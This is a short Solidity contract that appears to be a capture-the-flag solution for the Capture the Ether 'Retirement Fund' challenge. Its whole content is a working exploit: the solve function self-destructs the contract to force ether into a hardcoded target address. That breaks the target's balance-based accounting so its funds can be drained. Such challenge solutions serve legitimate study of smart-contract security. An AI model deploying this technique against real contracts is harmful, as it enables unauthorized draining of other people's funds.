pragma solidity ^0.4.21;

contract CTE_RetirementFundSolve {
    
    address private targetContract = 0x6c83624Df182E541B85be1Eb89A122b8cb597Dcc;
    
    function CTE_RetirementFundSolve() public payable { }
    
    function() public payable { }
    
    function solve() public {
        require(address(this).balance > 0, "Not enough balance");
        selfdestruct(targetContract);
    }
    
}